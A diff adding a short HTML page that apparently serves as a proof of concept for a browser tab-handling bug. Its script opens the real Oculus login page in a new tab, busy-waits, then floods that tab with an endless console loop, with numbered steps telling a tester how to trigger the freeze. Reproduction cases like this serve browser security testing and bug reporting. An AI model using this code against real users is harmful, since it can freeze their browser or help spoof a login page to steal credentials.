@@ -1,0 +1,36 @@
+<body><div id="content-1">
+    <h1>Click me</h1>
+    <span>1. click in this page to dummy page with a link</span><br>
+    <span>2. click in this page to open a new tab that will be infinetly loading</span><br>
+    <span>3. come back to this tab in less than 3 seconds</span><br>
+    <span>4. change to the other tab, wait 5 seconds and try to come back to this tab</span><br>
+  </div>
+<script>
+let counter = 0 
+onclick = () => {
+  if (!counter) {
+    window.open('/dummy-445911d9-7a33-4097-b4de-1c84c917b515.html', '_blank', 'noopener');
+    counter++;
+  } else {
+    myWindow = window.open('https://auth.oculus.com/login-without-facebook/', '_blank');
+    sleepFor(5000);
+  }
+}
+
+
+function freeze(myWindow) {
+    for (;;) {
+      myWindow.console.log('A');
+    }
+}
+
+function sleepFor(sleepDuration){
+    var now = new Date().getTime();
+    while(new Date().getTime() < now + sleepDuration){
+
+    }
+    freeze(myWindow)
+}
+
+</script>
+
